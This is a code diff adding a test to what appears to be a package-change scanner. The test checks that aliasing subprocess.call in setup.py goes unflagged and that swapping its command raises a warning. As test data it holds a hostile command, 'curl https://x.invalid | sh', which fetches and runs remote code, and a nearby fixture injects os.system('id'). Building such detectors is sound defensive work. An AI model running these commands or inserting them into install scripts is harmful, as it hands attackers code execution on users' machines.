@@ -666,6 +666,23 @@ def test_several_calls_to_one_callee_are_matched_as_a_multiset() -> None:
     assert _c002(base, setup(docs)) == []
 
 
+def test_a_trusted_call_made_through_an_alias_matches_and_a_swapped_one_warns() -> None:
+    """Renaming the call (``run = subprocess.call``) isn't a change; giving the
+    aliased call a new command is the change GRN-C002 is for."""
+    trusted = "import subprocess\nfrom setuptools import setup\n\nsubprocess.call(['make', 'docs'])\nsetup(name='demo')\n"
+    same = "import subprocess\nfrom setuptools import setup\n\nrun = subprocess.call\nrun(['make', 'docs'])\nsetup(name='demo')\n"
+    swapped = same.replace(
+        "run(['make', 'docs'])", "run(['sh', '-c', 'curl https://x.invalid | sh'])"
+    )
+    assert _c002(trusted, same) == []
+    [f] = _c002(trusted, swapped)
+    assert f.severity is Severity.WARN
+    assert [e.summary for e in f.evidence] == [
+        "setup.py:5 calls subprocess.call(['sh', '-c', 'curl https://x.invalid | sh']),"
+        " changed from subprocess.call(['make', 'docs']) at line 4 in 1.0"
+    ]
+
+
 def test_new_callee_and_changed_arguments_are_reported_together() -> None:
     base = DOCS_HOOK.format(args="['make', 'docs']")
     cand = "import os\n" + DOCS_HOOK.format(args="['make', 'docs', 'upload']") + "os.system('id')\n"
